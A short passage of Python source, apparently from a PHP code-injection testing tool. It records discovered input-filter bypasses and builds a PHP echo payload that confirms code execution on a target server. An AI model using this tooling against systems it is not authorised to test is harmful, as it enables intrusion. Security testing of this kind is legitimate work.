        return self.__filter_bypass

    @filter_bypass.setter
    def filter_bypass(self, p):
        if p is None:
            return
        if p == self.__filter_bypass:
            return

        if self.__filter_bypass:
            info(f"Update filter bypass: {str(p)}")
        else:
            success(f"Found filter bypass: {str(p)}")

        self.__filter_bypass = p

    """
    return php code
    """

    def php_exec_print_timestamp(self):

        first = self.unique_identifier[0]
        second = self.unique_identifier[1:]

        return f"<?php echo '{first}' . '{second}'; ?>"
